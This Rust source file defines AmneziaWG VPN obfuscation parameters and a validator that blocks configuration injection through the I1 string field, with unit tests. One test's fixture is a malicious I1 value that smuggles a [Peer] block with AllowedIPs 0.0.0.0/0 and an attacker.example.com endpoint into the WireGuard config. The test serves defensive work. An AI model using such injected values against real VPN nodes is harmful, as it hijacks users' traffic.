use crate::error::{anyhow, Result};
use serde::{Deserialize, Serialize};

/// AmneziaWG obfuscation parameters — 11 fields matching the server's
/// `awg_params_epoch.params` JSONB schema and the orchestrator's `AwgParams`
/// struct in `cmd/orchestrator/awg_params.go`.
///
/// I1 (InitString) is a string value containing arbitrary bytes rendered as
/// angle-bracket tokens (e.g. `<r 2><b 0x0100>...`). Added in T1.3.x lockstep
/// with the Go orchestrator fix. Deserialization uses `default` so that
/// pre-I1 DB rows (where the field is absent from JSON) deserialize without
/// error — `i1` will be `None` and conf_merge skips the I1 line.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct AwgParams {
    #[serde(rename = "Jc")]
    pub jc: i64,
    #[serde(rename = "Jmin")]
    pub jmin: i64,
    #[serde(rename = "Jmax")]
    pub jmax: i64,
    #[serde(rename = "S1")]
    pub s1: i64,
    #[serde(rename = "S2")]
    pub s2: i64,
    #[serde(rename = "S4")]
    pub s4: i64,
    #[serde(rename = "H1")]
    pub h1: i64,
    #[serde(rename = "H2")]
    pub h2: i64,
    #[serde(rename = "H3")]
    pub h3: i64,
    #[serde(rename = "H4")]
    pub h4: i64,
    /// InitString — arbitrary bytes as conf literal. `None` when absent from DB row.
    #[serde(rename = "I1", default)]
    pub i1: Option<String>,
}

/// Characters forbidden in the I1 (InitString) conf literal.
///
/// I1 is the only central-sourced param typed as an untyped `String`; the other
/// 10 are `i64` and render to a single `Key = <digits>` line by construction, so
/// they carry no conf-injection surface. A hostile or MITM'd central server (the
/// TLS+bearer transport authenticates the connection, NOT the field content)
/// could otherwise set a multi-line I1 whose embedded newline + `[Peer]` header
/// splices an attacker peer (`AllowedIPs = 0.0.0.0/0`, `Endpoint = attacker`)
/// into the kernel WireGuard peer table when the merged conf is piped through
/// `awg-quick strip | awg syncconf` (see `agent.rs` apply path).
///
/// `\n`/`\r` = the line-break primitive (start a new conf directive); `[`/`]` =
/// the section-header primitive (open a `[Peer]`/`[Interface]` block). Legit AWG
/// I1 values are single-line angle-bracket tokens (`<r N><b 0xHH>...`) and
/// contain none of these. Mirrors the newline-reject guard shipped for the
/// sibling central-sourced secret in `opec/src/secrets/sfu_key.rs` — applied
/// here to a FAR more sensitive target (the kernel peer table).
const I1_FORBIDDEN_CHARS: &[char] = &['\n', '\r', '[', ']'];

/// Reject an I1 (InitString) value that carries any conf-injection primitive.
///
/// Public so the splice site (`conf_merge::merge_obfuscation_params`) shares this
/// single grammar authority rather than re-deriving the charset. A rejection is a
/// hostile-central / MITM signal — the caller SHOULD bump
/// `awg_params_agent_param_rejected_total{field="i1"}` (Task 12 exporter) and
/// alert critical.
pub fn validate_i1(value: &str) -> Result<()> {
    if let Some(bad) = value.chars().find(|c| I1_FORBIDDEN_CHARS.contains(c)) {
        return Err(anyhow!(
            "awg param rejected: field=i1 contains forbidden character {:?} \
             (conf-injection guard) — refusing to splice into awg0.conf",
            bad
        ));
    }
    Ok(())
}

impl AwgParams {
    /// Validate central-sourced string params before they are spliced into
    /// `awg0.conf`. Currently only I1 (InitString) is an untyped string; the
    /// other 10 params are `i64` and are injection-safe by construction.
    ///
    /// Returns `Err` naming the offending field (`field=i1`) if I1 contains any
    /// [`I1_FORBIDDEN_CHARS`]. Called at the splice choke point so EVERY path
    /// from a central-sourced param to the kernel peer table is covered,
    /// regardless of how the params were fetched or deserialized.
    pub fn validate(&self) -> Result<()> {
        if let Some(i1) = self.i1.as_deref() {
            validate_i1(i1)?;
        }
        Ok(())
    }
}

/// Response shape from `GET /api/partner/awg-params/latest?component=awg`.
/// The `params` field is the JSONB blob; `epoch` is a monotonically increasing
/// integer (Postgres BIGINT) identifying the rotation round.
#[derive(Debug, Deserialize)]
pub struct AwgParamsLatestResponse {
    pub epoch: i64,
    pub params: AwgParams,
}

/// Payload for `POST /api/partner/awg-params/applied` (T1.3.e receiver).
/// Sent best-effort; loop continues on failure.
///
/// Note: `node_id` is NOT in this payload — backend derives it from the
/// Bearer-token auth context (lookup partner_nodes by service_token_hash).
/// Backend struct AwgParamsAppliedRequest uses #[serde(deny_unknown_fields)],
/// so sending node_id here would 422. Security-correct: client can't spoof
/// which node it claims to be by passing a different node_id in the body.
#[derive(Debug, Serialize)]
pub struct AwgAppliedPayload {
    pub component: &'static str,
    pub epoch: i64,
}

#[cfg(test)]
mod tests {
    use super::*;

    fn params_with_i1(i1: Option<&str>) -> AwgParams {
        AwgParams {
            jc: 11,
            jmin: 50,
            jmax: 1000,
            s1: 17,
            s2: 18,
            s4: 18,
            h1: 123456789,
            h2: 234567890,
            h3: 345678901,
            h4: 456789012,
            i1: i1.map(str::to_owned),
        }
    }

    /// A legit single-line angle-bracket I1 value must validate clean.
    #[test]
    fn validate_accepts_legit_single_line_i1() {
        let ok = "<r 2><b 0x0100><b 0x0001><b 0x0000><b 0x0000><b 0x0000>";
        assert!(validate_i1(ok).is_ok(), "legit I1 rejected: {ok:?}");
        assert!(params_with_i1(Some(ok)).validate().is_ok());
    }

    /// I1 absent (pre-I1 DB rows) and empty I1 must validate clean — they carry
    /// no injection surface and are skipped downstream.
    #[test]
    fn validate_accepts_none_and_empty_i1() {
        assert!(params_with_i1(None).validate().is_ok(), "None must pass");
        assert!(params_with_i1(Some("")).validate().is_ok(), "empty must pass");
        assert!(validate_i1("").is_ok());
    }

    /// FINDING REPRO (crypto_invariant/critical): a multi-line I1 carrying an
    /// embedded `[Peer]` block with a wildcard AllowedIPs + attacker Endpoint
    /// MUST be rejected — otherwise it splices an attacker peer into the kernel
    /// WireGuard peer table via `awg-quick strip | awg syncconf`. FAILS today.
    #[test]
    fn validate_rejects_multiline_peer_injection() {
        let malicious = "<r 2><b 0x0100>\n\
                         [Peer]\n\
                         PublicKey = ATTACKERAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\n\
                         AllowedIPs = 0.0.0.0/0\n\
                         Endpoint = attacker.example.com:51820";
        assert!(
            validate_i1(malicious).is_err(),
            "multi-line [Peer] injection must be REJECTED by validate_i1"
        );
        assert!(
            params_with_i1(Some(malicious)).validate().is_err(),
            "multi-line [Peer] injection must be REJECTED by AwgParams::validate"
        );
    }

    /// Each individual injection primitive is rejected on its own — newline,
    /// carriage return, and the `[`/`]` section-header brackets.
    #[test]
    fn validate_rejects_each_forbidden_char() {
        for bad in ["a\nb", "a\rb", "<r 2>[", "<r 2>]"] {
            assert!(
                validate_i1(bad).is_err(),
                "forbidden-char value must be rejected: {bad:?}"
            );
        }
    }

    /// The rejection error names the field so the Task 12 exporter can label
    /// `awg_params_agent_param_rejected_total{field="i1"}`.
    #[test]
    fn validate_error_names_field_i1() {
        let err = validate_i1("boom\n[Peer]").unwrap_err().to_string();
        assert!(
            err.contains("field=i1"),
            "rejection error must carry field=i1 for the counter label, got: {err}"
        );
    }
}
